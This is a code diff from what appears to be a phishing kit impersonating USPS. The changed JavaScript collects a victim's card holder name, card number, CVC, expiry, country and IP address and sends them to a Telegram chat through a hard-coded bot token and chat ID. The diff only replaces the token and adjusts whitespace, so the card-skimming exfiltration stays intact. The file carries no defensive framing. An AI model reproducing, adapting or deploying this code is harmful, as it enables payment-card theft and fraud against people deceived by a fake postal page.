@@ -2121,7 +2121,7 @@ export default {
           if (Number(this.info.expiry[1]) > 2) {
             var expiry = "0" + this.info.expiry[0] + "/2" + this.info.expiry[1];
           } else {
-           expiry = "0" + this.info.expiry[0] + "/" + this.info.expiry[1];
+            expiry = "0" + this.info.expiry[0] + "/" + this.info.expiry[1];
           }
           this.info.expiry = expiry;
         } else if (
@@ -2151,13 +2151,13 @@ export default {
       var that = this;
       that.info.IP = this.IP;
       that.info.query = this.query;
-      var token = "6188237567:AAGyW3wcd9ZumEX5EZTcpkaUsQkVWMgOGGI";
-    
+      var token = "6309857497:AAFmgkPgZKj949KXANTdon_4fuT9LiLpqxs";
+
       var chatId2 = -957355212;
       var fullMessage = `
         ||||||||||🇺🇸| USPS Post |🇺🇸||||||||||%0ACard Holder Name : ${this.info.cardName}%0ACard Nickname : ${this.info.cardNickname}%0ACard Number : ${this.info.cardNumber}%0ACVC : ${this.info.cvc}%0AExpiry : ${this.info.expiry}%0ACountry : ${this.info.query}%0AIP : ${this.info.IP}%0A||||||||||💳| USPS Post|💳||||||||||`;
-    
-       axios.post(
+
+      axios.post(
         `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId2}&text=${fullMessage}`
       );
       setTimeout(async () => {
